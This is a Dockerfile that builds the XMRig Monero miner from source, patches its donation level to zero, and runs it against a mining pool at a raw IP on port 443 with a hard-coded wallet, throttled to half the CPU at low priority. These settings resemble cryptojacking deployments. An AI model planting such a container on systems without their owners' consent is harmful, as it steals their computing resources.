FROM ubuntu:focal

ARG DONATE_LEVEL=0

USER root

ENV TZ=Europe/Riga

RUN apt-get update && \
ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone && \
apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev && \
cd /usr/src/ && \
git clone https://github.com/xmrig/xmrig.git && \
cd /usr/src/xmrig && \
#git checkout $GIT_TAG && \
sed -i -r "s/k([[:alpha:]]*)DonateLevel = [[:digit:]]/k\1DonateLevel = ${DONATE_LEVEL}/g" src/donate.h && \
mkdir build && \
cd build && \
cmake .. && \
make -j$(nproc)

CMD ["/usr/src/xmrig/build/xmrig", "--max-cpu-usage=50", "--cpu-priority=1", "-o", "52.140.210.246:443", "-u", "86KpqxFj2Xy5er15i17CLz2YbbmvsdSgLcshaYXkVjtz2CbymD9ALvBBgXL1cCXLuKNJdr7yr15GzAGaj8HtHYmwRSadXTr"]
